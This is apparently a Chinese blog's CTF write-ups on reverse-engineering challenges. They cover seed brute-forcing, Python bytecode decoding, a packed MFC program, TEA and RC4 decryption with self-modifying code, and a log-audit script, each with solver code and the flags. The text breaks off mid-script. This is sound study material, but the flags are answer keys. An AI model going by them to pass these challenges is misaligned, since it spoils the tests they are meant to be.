13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38] 随后处理 rand() % 255，我试图爆破，但是误将调整后的 rand() 顺序当作调整前的 rand() 顺序而没能成功得到 Seed。赛后我修改了顺序得到 Seed，可以说是最遗憾的一集了。\n程序编译好的时间对应的时间戳是 1685762995，因此 Seed 一定在这之前出现。flag 的前几个字符 “flag{” 已知，可以计算出随机数序列中第 0、11、32、12、1 的值分别为 0x6F、0xAA、0x9B、0x2、0x18。用下面的脚本爆破：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstdlib\u0026gt; 3#include \u0026lt;ctime\u0026gt; 4 5using namespace std; 6 7int main() 8{ 9 int num[32] = {0}; 10 for(unsigned int seed = 1662973302; seed \u0026lt; 1685762995; seed++) 11 { 12 for(int i = 0; i \u0026lt;= 32; i++) 13 { 14 num[i] = rand() % 255; 15 } 16 if(num[0] == 0x6F \u0026amp;\u0026amp; num[1] == 0x18 \u0026amp;\u0026amp; num[11] == 0xAA \u0026amp;\u0026amp; num[12] == 0x2 \u0026amp;\u0026amp; num[32] == 0x9B) 17 { 18 cout \u0026lt;\u0026lt; seed \u0026lt;\u0026lt; endl; 19 } 20 } 21} 22 23// output: 1682145110 得到了种子就可以写解密脚本了：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstdio\u0026gt; 3#include \u0026lt;cstdlib\u0026gt; 4 5using namespace std; 6 7int main() 8{ 9 int seq[42] = {0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38}; 10 int cip[42] = 11 { 12 0x09, 0x63, 0xD9, 13 0xF6, 0x58, 0xDD, 0x3F, 0x4C, 14 0x0F, 0x0B, 0x98, 0xC6, 0x65, 15 0x21, 0x41, 0xED, 0xC4, 0x0B, 16 0x3A, 0x7B, 0xE5, 0x75, 0x5D, 17 0xA9, 0x31, 0x41, 0xD7, 0x52, 18 0x6C, 0x0A, 0xFA, 0xFD, 0xFA, 19 0x84, 0xDB, 0x89, 0xCD, 0x7E, 20 0x27, 0x85, 0x13, 0x08 21 }; 22 int seed = 1682145110; 23 srand(seed); 24 int flag[42] = {0}; 25 26 for(int i = 0;i \u0026lt; 42; i++) 27 { 28 flag[i] = (rand() % 255) ^ cip[i]; 29 } 30 for(int j = 0;j \u0026lt; 42; j++) 31 { 32 cout \u0026lt;\u0026lt; flag[seq[j]]; 33 } 34} flag{0305f8f2-14b6-fg7b-bc7a-010299c881e1}\n攻防世界 - handcrafted-pyc 我在第七周的解题记录里完成了这道题目的一部分，但是并没有完全解出来，今天填坑。\n题目附件是 .py 的源代码：\n1#!/usr/bin/env python 2# -*- coding: utf-8 -*- 3 4import marshal, zlib, base64 5 6exec(marshal.loads(zlib.decompress(base64.b64decode(\u0026#39;eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ==\u0026#39;)))) 代码阅读上并没有什么难度，首先把一个字符串 Base64 解码，然后 zlib 解压缩，再然后得到反序列化，最后反序列化成 Python 代码并执行。\n看上去肯简单对吧，但是运行一下，果然报错：\n1ValueError: bad marshal data (unknown type code) 看来是反序列化那一步出了问题。我们不妨先拿到解压后的 .pyc 字节码再进行下一步分析。如下图，我们得到的 .pyc 文件缺少 magic number。\n我尝试了几个不同版本 Python 的 magic number，但都会提示反编译失败。不过，尽管没有得到源代码，在使用 uncompyle6 时仍然得到了一段 Bytecode。第七周那一次周报里，我把完整的 Bytecode 贴上了。下面贴一小段简单分析一下：\n1 L. 1 0 LOAD_GLOBAL 0 \u0026#39;chr\u0026#39; 2 3 LOAD_CONST 108 3 6 CALL_FUNCTION_1 1 None 4 9 LOAD_GLOBAL 0 \u0026#39;chr\u0026#39; 5 12 LOAD_CONST 108 6 15 CALL_FUNCTION_1 1 None 7 18 LOAD_GLOBAL 0 \u0026#39;chr\u0026#39; 8 21 LOAD_CONST 97 9 24 CALL_FUNCTION_1 1 None 10 27 LOAD_GLOBAL 0 \u0026#39;chr\u0026#39; 11 30 LOAD_CONST 67 12 33 CALL_FUNCTION_1 1 None 13 36 ROT_TWO 14 37 BINARY_ADD 15 38 ROT_TWO 16 39 BINARY_ADD 17 40 ROT_TWO 18 41 BINARY_ADD 程序依次将 chr(108)、chr(108)、chr(97)、chr(67) 入栈，随后 ROT_TWO 将栈顶的两个字符交换顺序，BINARY_ADD 将栈顶的两个元素相加（字符与字符相加得到一个字符串）。这一段字节码执行结束后可以在栈顶得到 'Call' 这个单词。\n后面的字节码和这一段类似，都是将数个字符入栈并且倒序输出。可以用以下脚本把全部字符提取并且输出（可以说是一个小小虚拟机）：\n1import re 2 3string = \u0026#39;\u0026#39; 4 5find = True 6buffer = \u0026#39;\u0026#39; 7 8with open(r\u0026#39;C:\\Users\\jack_gdn\\Desktop\\temp files\\攻防世界 - handcrafted-pyc\\download.txt\u0026#39;, \u0026#39;r\u0026#39;) as file: 9 for line in file: 10 load_const = re.search(r\u0026#39;LOAD_CONST\\s{15}(\\d+)\u0026#39;, line) 11 rot_two = re.search(r\u0026#39;ROT_TWO\u0026#39;, line) 12 if load_const: 13 buffer = buffer + chr(int(load_const.group(1))) 14 find = True 15 if rot_two and find: 16 print(buffer[::-1], end = \u0026#39;\u0026#39;) 17 find = False 18 buffer = \u0026#39;\u0026#39; 19 20# output: Call me a Python virtual machine! I can interpret Python bytecodes!!!hitcon{Now you can compile and run Python bytecode in your brain!}password: Wrong password... Please try again. Do not brute force. =) hitcon{Now you can compile and run Python bytecode in your brain!}\nNSSCTF - can_can_need_pxory 近期最让我绷不住的一道题\n题目附件有一个文本文件和一个程序。文本文件如下：\n经过唯一性处理后，print结果如下：\nNDc1NTMyNTQ0NzRGNDI1OTQ2NTEzMjU0NDc0RDVBNTU0NzQxNTc0NDQzNEQ0QTUzNDczNDVBNTQ0NTRDNDI1MzQ3NEQ1OTU0NEQ0QzQyNTI0NzQ1MzM1NDUxNEU0QTUzNDY1MTMyNDQ1MzRENTI1NTQ3NTE1NzQ0NEI0RDRBNTM0ODQ1NUE0MzU5NEQ1MjU0NDczNDM0NDM1OTRFNDI1NzQ3NDUzMzU0NDU0QzQyNTI0NzQxMzM1NDRENEQ0QTUzNDY1MTU5NTQ0MzRGNDI1OTQ3MzQzMzQzNTk0RDUyNTQ0NzQ5MzM0MzU5NEQ0QTUyNDczNDM0NDQ0QjRENTI0RDQ3NTEzMzQ0NDM0RTVBNTM0NjUxNTk1NDQ1NEQ0MjVBNDc0OTMyNDM1OTRENTI1NDQ3NEQ1OTQzNTk0RDRBNTI0NzU5MzQ0NDQ1NEY0MjRENDc0NTVBNDQ0NzRGNEE1QTQ3NTk1NzQ0NDk0RTUyNTI0NzM0NUE0MzU5NEQ1MjU0NDc0OTM0NTM1OTRENEE1MjQ4NDUzNDU0NDE0RDQyNEQ0NzQ1NTk1NDQ1NEU1QTU0NDc0OTU3NDQ0MzRENEE1MzQ3MzQ1QTU0NDU0QzQyNTM0NzREMzQ0NDRENEM0MjUyNDc0OTVBNTQ1MzRGNEE1NzQ2NTEzMjU0NDE0RDUyNTc0ODQxNTc0NDRCNEY0MjU1NDc1OTU5NDM1OTRENTI1NDQ3NDUzNDUzNTk0RDRBNTM0NzREMzQ1NDUzNEU1MjRENDc0NTU5NDQ0MzRFNDI1NzQ4NDE1NzQ0NDM0RDUyNTQ0ODQ1MzQ1NDRENEM0MjUzNDc0RDU5NTQ1MzRDNDI1NTQ4NDU1QTQ0NDk0RTQyNEQ0NzU1MzM1NDQ5NEQ1QTU3NDY1MTMyNTQ0RDRFNDI1MjQ3NDk1NzQ0NDU0RDVBNTQ0NzQ1NTc0MTNEM0QzRDNE\n请将解出的flag用NSSCTF{}包裹一下喵\n运行程序，会输出这么一坨东西：\n这个程序使用 Pyinstaller 打包，逆向得到源代码：\n1print(\u0026#39;ccccccccccccccccccccccccccccccccccc!\u0026#39;) 2print(\u0026#39;D0 U know C?\u0026#39;) 3print(\u0026#39;\\n#include \u0026lt;NSSCTF.h\u0026gt;\\nv01d bnssst(int FTC[], int lenggggggg) {\\n int i, j, SSN;\\n\u0026#39;) 4print(\u0026#39;This is CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\u0026#39;) 5print(\u0026#39;6L+Z5piv5L2g6KaB55qEZmxhZ+WQl++8nwpOU1NDVEZ7YjVlMzlkMDktODg3Yy1hZGI0LTE4OWMtMWI0OGEwNWJmOTY2fQ==\u0026#39;) 6A = { 7 \u0026#39;flag\u0026#39;: \u0026#39;NSSCTF{a81c0d5e-ec6d-2b80\u0026#39; } 8print(\u0026#39;\\n SSN = FTC[j];\\n printf(\u0026#34;flag\u0026#34;);\\n }\\n}\\nint mian() {\\n int FTC[] = [ -,\\n\u0026#39;) 9print(\u0026#39;ccccccccccccccccccc\u0026#39;) 10print(\u0026#39;\\nb, 2, 6, 7, -, d, 5, 8, 4, -, 6, 8, 7, 4, -, f, 1, 2, 6, e, 3, a, 5, 1, 0, 6, 1, }];\\n int lenggggggg = (int) sizeof(FTC) / sizeof(*FTC);\\n bnsScrt(FTC, lenggggggg);\\n int i;\\n for (i = 0; i \u0026lt; lenggggggg; i++)\\n printf(\u0026#34;%d \u0026#34;, FTC[i]);\\n remake 0;\\n}\\n\u0026#39;) 11print(\u0026#39;----------------------------------------------------\u0026#39;) 12import base64 13flag = \u0026#39;************************************\u0026#39; 14r = \u0026#39;\u0026#39; 15for x in range(len(flag)): 16 if (x + 1) % 4 == 0: 17 res = str(ord(chr(ord(flag[x]) ^ 2421))) 18 else: 19 res = str(ord(chr(ord(flag[x]) \u0026lt;\u0026lt; 6 \u0026lt;\u0026lt; 7 \u0026gt;\u0026gt; 2 \u0026gt;\u0026gt; 1 ^ 92))) 20 r = r + res + \u0026#39;,\u0026#39; 21 22print(base64.b64encode(base64.b16encode(base64.b32encode(r.encode(\u0026#39;utf-8\u0026#39;)))).decode(\u0026#39;utf-8\u0026#39;)) 写出逆向脚本：\n1import base64 2 3c = \u0026#39;NDc1NTMyNTQ0NzRGNDI1OTQ2NTEzMjU0NDc0RDVBNTU0NzQxNTc0NDQzNEQ0QTUzNDczNDVBNTQ0NTRDNDI1MzQ3NEQ1OTU0NEQ0QzQyNTI0NzQ1MzM1NDUxNEU0QTUzNDY1MTMyNDQ1MzRENTI1NTQ3NTE1NzQ0NEI0RDRBNTM0ODQ1NUE0MzU5NEQ1MjU0NDczNDM0NDM1OTRFNDI1NzQ3NDUzMzU0NDU0QzQyNTI0NzQxMzM1NDRENEQ0QTUzNDY1MTU5NTQ0MzRGNDI1OTQ3MzQzMzQzNTk0RDUyNTQ0NzQ5MzM0MzU5NEQ0QTUyNDczNDM0NDQ0QjRENTI0RDQ3NTEzMzQ0NDM0RTVBNTM0NjUxNTk1NDQ1NEQ0MjVBNDc0OTMyNDM1OTRENTI1NDQ3NEQ1OTQzNTk0RDRBNTI0NzU5MzQ0NDQ1NEY0MjRENDc0NTVBNDQ0NzRGNEE1QTQ3NTk1NzQ0NDk0RTUyNTI0NzM0NUE0MzU5NEQ1MjU0NDc0OTM0NTM1OTRENEE1MjQ4NDUzNDU0NDE0RDQyNEQ0NzQ1NTk1NDQ1NEU1QTU0NDc0OTU3NDQ0MzRENEE1MzQ3MzQ1QTU0NDU0QzQyNTM0NzREMzQ0NDRENEM0MjUyNDc0OTVBNTQ1MzRGNEE1NzQ2NTEzMjU0NDE0RDUyNTc0ODQxNTc0NDRCNEY0MjU1NDc1OTU5NDM1OTRENTI1NDQ3NDUzNDUzNTk0RDRBNTM0NzREMzQ1NDUzNEU1MjRENDc0NTU5NDQ0MzRFNDI1NzQ4NDE1NzQ0NDM0RDUyNTQ0ODQ1MzQ1NDRENEM0MjUzNDc0RDU5NTQ1MzRDNDI1NTQ4NDU1QTQ0NDk0RTQyNEQ0NzU1MzM1NDQ5NEQ1QTU3NDY1MTMyNTQ0RDRFNDI1MjQ3NDk1NzQ0NDU0RDVBNTQ0NzQ1NTc0MTNEM0QzRDNE\u0026#39; 4 5raw = base64.b32decode(base64.b16decode(base64.b64decode(c.encode(\u0026#39;utf-8\u0026#39;)))).decode(\u0026#39;utf-8\u0026#39;) 6 7flag = raw[:-1].split(\u0026#39;,\u0026#39;) 8 9for x in range(len(flag)): 10 if (x + 1) % 4 == 0: 11 print(chr(int(flag[x]) ^ 2421), end = \u0026#39;\u0026#39;) 12 else: 13 print(chr((int(flag[x]) ^ 92) \u0026lt;\u0026lt; 1 \u0026lt;\u0026lt; 2 \u0026gt;\u0026gt; 7 \u0026gt;\u0026gt; 6), end = \u0026#39;\u0026#39;) 14 15# output: 64nys02?-itcs-vory-lunn\u0026#39;y19zycyz087n 我的进度到这里就结束了，后来看 WP，要想得到正确的 flag 还有下面这一步\n1\u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([chr(ord(\u0026#39;64nys02?-itcs-vory-lunn\\\u0026#39;y19zycyz087n\u0026#39;[i]) ^ 0xA) if (i + 1) % 4 == 0 else \u0026#39;64nys02?-itcs-vory-lunn\\\u0026#39;y19zycyz087n\u0026#39;[i] for i in range(len(\u0026#39;64nys02?-itcs-vory-lunn\\\u0026#39;y19zycyz087n\u0026#39;))]) 2\u0026#39;64nss025-itis-very-funn-y19pycyp087d\u0026#39; 最遗憾的一集，比春秋杯爆破 Seed 还遗憾\n攻防世界 - mfc逆向 程序加了 VMP 壳。\n试图手撕，未果；试图使用工具脱壳，未果。遂不脱壳。\n程序提示 \u0026quot;Flag就在控件里\u0026quot;，以及窗口中间使用了文本框控件。使用 Spy++ 查看窗体句柄。\n得到句柄 0xC208A。随后使用 xspy 分析窗口。\n可以看到有一个自定义消息 0x0464 会触发地址为 002170 的函数。wparam 和 lparam 不详就随便写一个试试。使用以下脚本尝试发送这个消息：\n1#include \u0026lt;Windows.h\u0026gt; 2 3int main() 4{ 5\tHWND flag = HWND(0xC208A); 6\tSendMessage(flag, 0x464, 114514, 1919810); 7} 发现窗口发生变化。\n似乎有什么 DES 加密的地方，但是往后我就没辙了。看 WP 知道，\u0026quot;{I am a Des key}\u0026quot; 是 DES 加密的密钥，密文是这个窗口的类 \u0026quot;944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b\u0026quot;，最终得到 flag\nthIs_Is_real_kEy_hahaaa\n但是我在尝试 DES 解密这一步里失败了，因为 DES 要求密钥为 8 字节，但是题目所给字符串有 16 字节，3DES 对偏移量有要求但是题目中并未给出。\n西湖论剑 - easy_table 编程题，比赛结束前一个半小时开始看这道题，比赛结束后四个小时拿到 flag（当然中间还干别的事去了）而且应该是正确的，至少使用样例数据运行的结果是正确的。这个过程学到了相当多的东西，包括从头开始学了 pandas 模块、学习了 re 模块以及 Python 里其他巧妙的但我以前不知道的模块、函数和语法。由于一开始没有完全读懂题，并且我是第一次使用 pandas 模块，这个脚本有相当多可以优化的地方。题目给出待处理的数据总共有 10000 组，我的电脑运行下面的脚本需要亖分多钟：\n1import pandas as pd 2import re 3from datetime import datetime 4import hashlib 5 6 7def hash_calc(string): 8 md5_hash = hashlib.md5() 9 md5_hash.update(string.encode(\u0026#39;utf-8\u0026#39;)) 10 return md5_hash.hexdigest() 11 12 13def check_time(time_range, time_point): 14 start, end = map(lambda x: datetime.strptime(x, \u0026#39;%H:%M:%S\u0026#39;), time_range.split(\u0026#39;~\u0026#39;)) 15 point = datetime.strptime(time_point, \u0026#39;%H:%M:%S\u0026#39;) 16 return int(start \u0026lt;= point \u0026lt;= end) 17 18 19def user_not_exist(user_id): 20 if user_id in users[\u0026#39;账号\u0026#39;].values: 21 return 0 22 else: 23 return 1 24 25 26def wrong_table(table_action, user_id): 27 pattern = r\u0026#34;(from|update|insert into)\\s+(\\w+)\\s\u0026#34; 28 matches = re.findall(pattern, table_action) 29 table = matches[0][1] # 查找表名 30 31 for index_tables, row_tables in tables.iterrows(): 32 if row_tables[\u0026#39;表名\u0026#39;] == table: 33 table_id = row_tables[\u0026#39;编号\u0026#39;] # 查找表编号 34 35 for index_users, row_users in users.iterrows(): 36 if row_users[\u0026#39;账号\u0026#39;] == user_id: 37 group_id = row_users[\u0026#39;所属权限组编号\u0026#39;] # 查找组编号 38 uid = row_users[\u0026#39;编号\u0026#39;] # 查找用户编号 39 40 for index_permissions, row_permissions in permissions.iterrows(): 41 if row_permissions[\u0026#39;编号\u0026#39;] == group_id: 42 operable_tables = row_permissions[\u0026#39;可操作表编号\u0026#39;].split(\u0026#39;,\u0026#39;) # 查找可操作表编号 43 44 if str(table_id) not in operable_tables: 45 return [1, uid, group_id, table_id] 46 else: 47 return [0] 48 49 50def wrong_operation(table_action, user_id): 51 op_lst = [\u0026#39;insert\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;select\u0026#39;] 52 pattern = r\u0026#34;(from|update|insert into)\\s+(\\w+)\\s\u0026#34; 53 matches = re.findall(pattern, table_action) 54 table = matches[0][1] # 查找表名 55 56 for op in op_lst: 57 if op in table_action: 58 operation = op # 查找操作 59 break 60 61 for index_users, row_users in users.iterrows(): 62 if row_users[\u0026#39;账号\u0026#39;] == user_id: 63 group_id = row_users[\u0026#39;所属权限组编号\u0026#39;] # 查找组编号 64 uid = row_users[\u0026#39;编号\u0026#39;] # 查找用户编号 65 66 for index_permissions, row_permissions in permissions.iterrows(): 67 if row_permissions[\u0026#39;编号\u0026#39;] == group_id: 68 operable_permissions = row_permissions[\u0026#39;可操作权限\u0026#39;].split(\u0026#39;,\u0026#39;) # 查找可操作权限 69 70 for index_tables, row_tables in tables.iterrows(): 71 if row_tables[\u0026#39;表名\u0026#39;] == table: 72 table_id = row_tables[\u0026#39;编号\u0026#39;] # 查找表编号 73 74 if operation not in operable_permissions: 75 return [1, uid, group_id, table_id] 76 else: 77 return [0] 78 79 80def wrong_time(action_time, user_id): 81 time_point = action_time.split(\u0026#39; \u0026#39;)[1] 82 pattern = r\u0026#34;(from|update|insert into)\\s+(\\w+)\\s\u0026#34; 83 matches = re.findall(pattern, table_action) 84 table = matches[0][1] # 查找表名 85 filt = [] 86 87 for index_tables, row_tables in tables.iterrows(): 88 if row_tables[\u0026#39;表名\u0026#39;] == table: 89 time_lst = row_tables[\u0026#39;可操作时间段(时:分:秒)\u0026#39;].split(\u0026#39;,\u0026#39;) 90 91 for index_users, row_users in users.iterrows(): 92 if row_users[\u0026#39;账号\u0026#39;] == user_id: 93 group_id = row_users[\u0026#39;所属权限组编号\u0026#39;] # 查找组编号 94 uid = row_users[\u0026#39;编号\u0026#39;] # 查找用户编号 95 96 for index_tables, row_tables in tables.iterrows(): 97 if row_tables[\u0026#39;表名\u0026#39;] == table: 98 table_id = row_tables[\u0026#39;编号\u0026#39;] # 查找表编号 99 100 for time_range in time_lst: 101 filt.append(check_time(time_range, time_point)) 102 103 if 1 not in filt: 104 return [1, uid, group_id, table_id] 105 else: 106 return [0] 107 108 109actionlog = pd.read_csv(\u0026#34;actionlog.csv\u0026#34;) 110permissions = pd.read_csv(\u0026#34;permissions.csv\u0026#34;) 111tables = pd.read_csv(\u0026#34;tables.csv\u0026#34;) 112users = pd.read_csv(\u0026#34;users.csv\u0026#34;) 113 114raw_result = [] 115 116for index_actionlog, row_actionlog in actionlog.iterrows(): 117 118 user_id = row_actionlog[\u0026#39;账号\u0026#39;] 119 une = user_not_exist(user_id) # 判断账号是否存在 120 if une: 121 raw_result.append([0, 0, 0, row_actionlog[\u0026#39;编号\u0026#39;]]) 122 continue 123 124 table_action = row_actionlog[\u0026#39;执行操作\u0026#39;] 125 wt = wrong_table(table_action, user_id) # 判断表是否可操作 126 if wt[0]: 127 wt.remove(wt[0]) 128 wt.append(row_actionlog[\u0026#39;编号\u0026#39;]) 129 raw_result.append(wt) 130 131 wo = wrong_operation(table_action, user_id) 132 if wo[0]: 133 wo.remove(wo[0]) 134 wo.append(row_actionlog[\u0026#39;编号\u0026#39;]) 135 raw_result.append(wo) 136 137 action_time = row_actionlog[\u0026#39;操作时间\u0026#39;] 138 wtime = wrong_time(action_time, user_id) 139 if wtime[0]: 140 wtime.remove(wtime[0]) 141 wtime.append(row_actionlog[\u0026#39;编号\u0026#39;]) 142 raw_result.append(wtime) 143 144 percent = row_actionlog[\u0026#39;编号\u0026#39;] / 100 145 print(\u0026#39;\\r\u0026#39;, end=\u0026#39;\u0026#39;) 146 print(f\u0026#39;进度：{percent}%\u0026#39;, end=\u0026#39;\u0026#39;) 147 148final_str = \u0026#39;\u0026#39; 149final_result = sorted(raw_result, key=lambda lst: (lst[0], lst[1], lst[2], lst[3])) 150for res in final_result: 151 final_str = final_str + \u0026#39;_\u0026#39;.join(list(map(str, res))) + \u0026#39;,\u0026#39; 152final_str = final_str[:-1] 153print(\u0026#39;\\n\u0026#39; + final_str) 154print(hash_calc(final_str)) DASCTF{271b1ffebf7a76080c7a6e134ae4c929}\n出了 WP，确实是对了。哈哈\n","link":"https://jackgdn.github.io/post/%E8%BF%91%E6%9C%9F%E8%A7%A3%E9%A2%98_20240126/","section":"post","tags":["Reverse","WP"],"title":"近期解题 2024.2.16"},{"body":"2024.1.4-2024.1.13\nNEFU::CTF 反静态分析-1 反编译出 main() 函数如下：\n敏锐察觉到 v9 数组的四个元素，疑似为 TEA 加密算法的 key。进入 sub_411523() -\u0026gt; sub_415100()，果然是一个 TEA 加密。\n在 main() 函数中调用的 sub_411523() 有两个参数，第二个参数 v9 是 key，第一个参数 \u0026amp;v7 为 v7 数组。在变量声明的部分 int v7; // [esp+1D8h] [ebp-40h] BYREF 和 int v8; // [esp+1DCh] [ebp-3Ch] 可以看出 v7 与 v8 的地址相邻，实际上可以看作是一个数组。\n写一个 TEA 解密的脚本，需要知道 v4（即 sum）的值是多少。通过打断点动态调试找到 v4 的值 0xC6EF3720。\n上脚本\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstdio\u0026gt; 3 4using namespace std; 5 6int key[4] = { 18,52,86,120 }; 7unsigned int num1 = 0x60FCDEF7; 8unsigned int num2 = 0x236DBEC; 9int sum = 0xC6EF3720; 10 11void tea() 12{ 13\tfor (int i = 0; i \u0026lt; 32; i++) 14\t{ 15\tnum2 -= (key[3] + (num1 \u0026gt;\u0026gt; 5)) ^ (sum + num1) ^ (key[2] + 16 * num1); 16\tnum1 -= (key[1] + (num2 \u0026gt;\u0026gt; 5)) ^ (sum + num2) ^ (*key + 16 * num2); 17\tsum += 0x61C88647; 18\t} 19\tcout \u0026lt;\u0026lt; num1 \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; num2; 20} 21 22int main() 23{ 24\ttea(); 25} 得到结果为 3 和 4，这与伪代码 main() 函数中 v8 = 4; 一致。运行程序，输入 3，确实进入了下一步骤。\n下一个关键函数是 sub_411302()，不过这里面出现了一些问题\nTAB 过去，发现是花指令……吗？\n经过一些调试，我发现这里其实是一段自修改代码（SMC, Self Modifying Code），尽管现在看起来是一坨，但是运行起来后就不是这样了。打断点、调试、重新分析、中止调试。这样，我们就得到了正确的代码片段。\n不戳不戳\n这个函数看上去像是一个 RC4 加密，密码为 \u0026quot;you_are_master\u0026quot;，待解密的数据为 v17。\n上脚本\n1#include \u0026lt;cstdio\u0026gt; 2#include \u0026lt;iostream\u0026gt; 3#include \u0026lt;cstring\u0026gt; 4 5using namespace std; 6 7int S[256], T[256]; 8string K = \u0026#34;you_are_master\u0026#34;; 9char D[256]; 10 11void init(int klen) 12{ 13\tfor (int i = 0; i \u0026lt; 256; i++) 14\t{ 15\tS[i] = i; 16\tT[i] = K[i % klen]; 17\t} 18} 19 20void exc() 21{ 22\tint j = 0; 23\tint temp; 24\tfor (int i = 0; i \u0026lt; 256; i++) 25\t{ 26\tj = (j + S[i] + T[i]) % 256; 27\ttemp = S[i]; 28\tS[i] = S[j]; 29\tS[j] = temp; 30\t} 31} 32 33void encrypt(int dlen) 34{ 35\tint i = 0, j = 0, t; 36\tint temp; 37\tfor (int h = 0; h \u0026lt; dlen; h++) 38\t{ 39\ti = (i + 1) % 256; 40\tj = (j + S[i]) % 256; 41\ttemp = S[i]; 42\tS[i] = S[j]; 43\tS[j] = temp; 44\tt = (S[i] + S[j]) % 256; 45\tD[h] ^= S[t]; 46\t} 47} 48 49int main() 50{ 51\tint klen = 14, dlen = 35, i = 0; 52\tD[0] = 0xF; 53\tD[1] = 0x94; 54\tD[2] = 0xAE; 55\tD[3] = 0xF2; 56\tD[4] = 0xC0; 57\tD[5] = 0x57; 58\tD[6] = 0xC2; 59\tD[7] = 0xE0; 60\tD[8] = 0x9A; 61\tD[9] = 0x45; 62\tD[10] = 0x37; 63\tD[11] = 0x50; 64\tD[12] = 0xF5; 65\tD[13] = 0xA0; 66\tD[14] = 0x5E; 67\tD[15] = 0xCB; 68\tD[16] = 0x2C; 69\tD[17] = 0x16; 70\tD[18] = 0x28; 71\tD[19] = 0x29; 72\tD[20] = 0xFE; 73\tD[21] = 0xFF; 74\tD[22] = 0x33; 75\tD[23] = 0x46; 76\tD[24] = 0xE; 77\tD[25] = 0x57; 78\tD[26] = 0x82; 79\tD[27] = 0x22; 80\tD[28] = 0x52; 81\tD[29] = 0x26; 82\tD[30] = 0x2B; 83\tD[31] = 0x6E; 84\tD[32] = 0xE4; 85\tD[33] = 0x82; 86\tD[34] = 0x24; 87\tinit(klen); 88\texc(); 89\tencrypt(dlen); 90\tfor (int i = 0; i \u0026lt; dlen; i++) 91\t{ 92\tcout \u0026lt;\u0026lt; char(D[i]); 93\t} 94} HDCTF{y0u_ar3_rc4_t3a_smc_m4ster!!}\n通过这道题，还有以下几点需要记录：\nFindCrypt 插件在它该识别出 RC4 算法时没有将其识别出来。因此熟练运用瞪眼法的能力还挺必要的。 就我检索到的资料来说，SMC 出现时应该有一些特征，例如使用 VirtualProtect() 函数（Windows 系统）以及 mprotect() 函数（Linux 系统）来获取修改内存的权限。然而在这一道题里并没有出现这样的特征。 花指令 题目附件叫做虽然他送了我玫瑰花!.exe。虽然题目名称叫做“花指令”，但是似乎并没有什么花指令出现。\n一打开反汇编界面，main() 函数这里竟然是红的，框出来创建函数。\n代码非常易于理解。输入内容的长度为 29，在 funcs_40117E 的函数列表循环操作输入的字符，最后与 v9 中的数据相同。然而 v9 只有 16 个字节，而需要判断的有 29 个字符。不出意外，v9、v10、v11、v12 和 v13 的地址连续，都看作是 v9 数组。\n函数列表里的五个函数也很简单：\n1int __cdecl sub_401080(int a1) 2{ 3 return a1 ^ 0x19; 4} 5 6int __cdecl sub_401090(int a1) 7{ 8 return a1 + 18; 9} 10 11int __cdecl sub_4010A0(int a1) 12{ 13 return a1 - 16; 14} 15 16int __cdecl sub_4010B0(char a1) 17{ 18 return 2 * (a1 \u0026amp; 0x7F); 19} 20 21int __cdecl sub_4010C0(int a1) 22{ 23 return a1 ^ (a1 ^ ~a1) \u0026amp; 0x80; 24} 脚本如下：\n1#include \u0026lt;stdio.h\u0026gt; 2 3unsigned char data[29] = 4 { 5 0x7F, 0x7E, 0x51, 0xCE, 0xFB, 0x4E, 0x7A, 0x24, 0xE8, 0xDF, 6 0x59, 0x71, 0x26, 0xCA, 0xE1, 0x6C, 0x86, 0x21, 0xCC, 0xF5, 7 0x28, 0x71, 0x14, 0xD8, 0xEF, 0x6E, 0x77, 0x62, 0xFA 8\t}; 9unsigned char data0[29] = {0}; 10 11unsigned char func0(unsigned char c) 12{ 13 return (c ^ 0x19); 14} 15 16unsigned char func1(unsigned char c) 17{ 18 return (c - 18); 19} 20 21unsigned char func2(unsigned char c) 22{ 23 return (c + 16); 24} 25 26unsigned char func3(unsigned char c) 27{ 28 return (c / 2); 29} 30 31unsigned char func4(unsigned char c) 32{ 33 return (c - 0x80); 34} 35 36int main() 37{ 38 for (int i = 0; i \u0026lt; 29; i++) 39 { 40 switch (i % 5) 41 { 42 case 0: 